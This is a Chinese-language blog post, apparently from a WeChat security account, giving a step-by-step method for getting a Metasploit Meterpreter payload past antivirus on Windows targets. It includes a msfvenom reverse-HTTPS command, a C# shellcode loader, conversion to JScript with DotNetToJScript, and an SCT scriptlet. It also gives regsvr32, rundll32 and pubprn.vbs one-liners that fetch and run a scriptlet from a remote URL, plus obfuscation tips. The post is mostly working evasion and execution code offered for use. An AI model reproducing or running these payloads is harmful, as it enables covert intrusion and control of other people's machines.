---
title: 免杀 MSF Windows Payload 的方法与实践
author: Moriarty
wechat_source: >-
  http://mp.weixin.qq.com/s?timestamp=1503366151&src=3&ver=1&signature=OYewMZH60kmig22U24i7m1KnELukSlJNssUTJCUs8vOoRu82ZCxaSI0AJPkJPqN7NG1LFSsA20wtWEQB3RPmOHn2Rp9CsWPc3NMcGcNXUvAev2eQaTFfFrheOgsg0J3a6IrrjLE5iIiM5wTCx21*JrfQSEZh00Du5JoA4vUiN*A=
date: '2017-08-12 00:00:00 +0000'

---

{% raw  %}
<p>MSF 已经是广为人知的非常流行的渗透平台，没有之一。而作为专注于后渗透的我，最常用的也是 MSF 强大的后渗透功能。在实战当中，经常需要在目标环境中获取一个 Meterpreter 的 shell。那么我面临的第一个问题，就是如何安安稳稳地、神不知鬼不觉地在目标环境中执行 Meterpreter 的 Payload。目前网上流行的免杀和隐蔽执行的思路有很多，今天我给大家介绍一下我屡试不爽的猥琐流方法。</p><p><br></p><p><strong>一、准备 Payload</strong></p><p><br></p><p>这个过程比较简单，大多数人应该都会。我们这里使用 msfvenom 生成一个 x86 的 Meterpreter 的 Payload 为例，直接上命令：</p><p><br></p><p>msfvenom&nbsp; -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.222 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe</p><p><br></p><p>大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。</p><p><br></p><p>生成的结果如下图（cat 命令显示的结果有问题，不用管它）：<br></p><p><br></p><p><img src="http://mmbiz.qpic.cn/mmbiz_png/kicMePHlP6TBibdD6O3fVv4bPzIQGmXuibk4Biar3C9hMYd7Zzp4JibZvLqYOR5kCe06KDT8pq2pQBqS5sToLhcjrKg/0?wx_fmt=png" style="width: 770px !important; height: 392.925px !important; visibility: visible !important;"></p><p><strong>二、准备 C# 工程</strong><br><br>我们需要创建一个 C# 工程，我这里使用 Visual Studio 2017。新建一个空白的 C# 的 Console 工程，.Net Framework 版本选择 2.0（保证兼容性）。</p><p><br></p><p>将如下代码黏贴覆盖到 Program.cs 中：<br></p><p><br></p><p>using System;<br>using System.Threading;<br>using System.Runtime.InteropServices;<br>namespace MSFWrapper<br>{<br>&nbsp;&nbsp;&nbsp; public class Program<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public Program()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RunMSF();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void RunMSF()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] MsfPayload = {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Paste your Payload here<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(2000);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void Main()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DllImport("kernel32.dll")]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DllImport("kernel32.dll")]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);<br>&nbsp;&nbsp;&nbsp; }<br>}</p><p><br></p><p>然后将先前生成的 Payload 的黏贴到代码中注释为“//Paste your Payload here”的地方。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。 增加 Release 版的 x86 编译对象，然后生成出 MSFWrapper.exe。</p><p><br></p><p><strong>三、转换 MSFWrapper.exe 为 js 文件</strong><br><br>这里要用到一个非常流弊的工具 DotNetToJScript，这是一款可以将 .net 程序转换为 jscript 代码的。工具下载地址：</p><p><br></p><p>https://github.com/tyranid/DotNetToJScript</p><p><br></p><p>使用如下命令进行转换：</p><p><br></p><p>F:\t00ls&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe</p><p><br></p><p>然后我们就可以用下面的命令执行我们的 MSF Payload：</p><p><br></p><p>C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js</p><p><br></p><p>这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！</p><p><br></p><p><strong>四、进一步猥琐化</strong><br><br>sct 大法</p><p><br></p><p>既然能够转换为 js 代码，那么我们自然会想到 sct 大法的应用。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”：</p><p><br></p><p>&lt;?XML version="1.0"?&gt;<br>&lt;scriptlet&gt;<br>&lt;registration <br>&nbsp;&nbsp;&nbsp; progid="Msf"<br>&nbsp;&nbsp;&nbsp; classid="{F0001111-0000-0000-0000-0000FEEDACDC}" &gt;<br>&nbsp;&nbsp;&nbsp; &lt;script language="JScript"&gt;<br>&nbsp;&nbsp;&nbsp; //paste code here<br>&nbsp;&nbsp;&nbsp; &lt;/script&gt;<br>&lt;/registration&gt;<br>&lt;/scriptlet&gt;</p><p><br></p><p>保存为 msf.sct（后缀名可以更改，比如 jpg 等）并上传至 Web Server 然后在目标机器上执行如下命令：</p><p><br></p><p>F:\t00ls&gt;c:\windows\SysWOW64\regsvr32 /s /u /n /i:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf.sct c:\windows\SysWOW64\scrobj.dll</p><p><br></p><p>Bingo！ <br></p><p><br></p><p>另外，我们也可以使用 script 或者 scriptlet 的方式来深度利用，这里我们要使用 DotNetToJSCript.exe 的 -m 参数来生成 scriptlet 文件，命令如下：</p><p><br></p><p>DotNetToJScript.exe -m -o=msf2.sct -c=MSFWrapper.Program MSFWrapper.exe</p><p><br></p><p>将 msf2.sct 文件上传到 Web Server 上，然后用如下命令在目标环境中执行：</p><p><br></p><p>F:\t00ls&gt;c:\windows\syswow64\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf2.sct");this.close()</p><p><br></p><p>Bingo!Bingo! <br></p><p><br></p><p>当然，如果目标环境是 Windows 7 以上版本，还可以这样：</p><p><br></p><p>F:\t00ls&gt;c:\windows\SysWOW64\cscript.exe c:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf2.sct</p><p><br></p><p>Bingo!Bingo!Bingo!</p><p><br></p><p><strong>五、关于深度免杀</strong></p><p><br></p><p>一般情况下按照上述方法，基本就可以免杀了。如果还有特殊要求的话，可以考虑做如下的额外工作：</p><p><br></p><ul style="list-style-type: disc;" class="list-paddingleft-2"><li><p>考虑对 MSF 生成的 Payload 用 MSF 自带的编码器进行编码，或者自己自定义方式去编码。</p></li><li><p>然后 base64 编码后，放入 C# 代码中。</p></li><li><p>生成的 js 代码可以进行模糊编码处理。 <br></p></li></ul><p><br></p><p>总之，一旦将二进制的东西变成脚本之后，免杀起来就会非常的简单！自己去发挥吧！</p><p><br></p><hr><p><br></p><p>后记：</p><p><br></p><p>答应老余同学从我的 DMZLab 圈子分享点干货出来，这是第一篇，我的圈子里有很多干货，如果对渗透测试感兴趣的可以加入，但是有个前提：加入必须有分享，前期对分享质量不会强要求，首先得学会分享。</p><p><br></p><p><img src="http://mmbiz.qpic.cn/mmbiz_jpg/kicMePHlP6TBaHD4netEvPaSkaZoIUiarUyGQbkw0zs2DOiaEowDibD2DcHNicgTgfLu27zvwDktfUyvyzia2knYWg0A/0?wx_fmt=jpeg" style="width: 710px !important; height: 1016px !important;"></p><p><br></p><p>微信扫描上面这个二维码加入。要了解这个圈子可以看之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081270&amp;idx=1&amp;sn=d89107875ee829723f10f0a013784279&amp;chksm=8485d529b3f25c3f49a3ce4a8ba3002ed3ed01436da70b70574b1623ad799c39a506ffc821d7&amp;scene=21#wechat_redirect" target="_blank">渗透圈子 DMZLab</a>。<br></p><p><br></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 14px; box-sizing: border-box !important; overflow-wrap: break-word !important;">-----------------</span></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 14px; box-sizing: border-box !important; overflow-wrap: break-word !important;">微信公众号「<span style="max-width: 100%; color: rgb(192, 0, 0); box-sizing: border-box !important; overflow-wrap: break-word !important;"><strong style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">Lazy-Thought</strong></span>」</span></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 14px; box-sizing: border-box !important; overflow-wrap: break-word !important;">几个黑客在维护，都很懒，都想改变点什么</span></p><hr/><a href="http://mp.weixin.qq.com/s?timestamp=1503366151&src=3&ver=1&signature=OYewMZH60kmig22U24i7m1KnELukSlJNssUTJCUs8vOoRu82ZCxaSI0AJPkJPqN7NG1LFSsA20wtWEQB3RPmOHn2Rp9CsWPc3NMcGcNXUvAev2eQaTFfFrheOgsg0J3a6IrrjLE5iIiM5wTCx21*JrfQSEZh00Du5JoA4vUiN*A=">微信地址</a>
{% endraw  %}

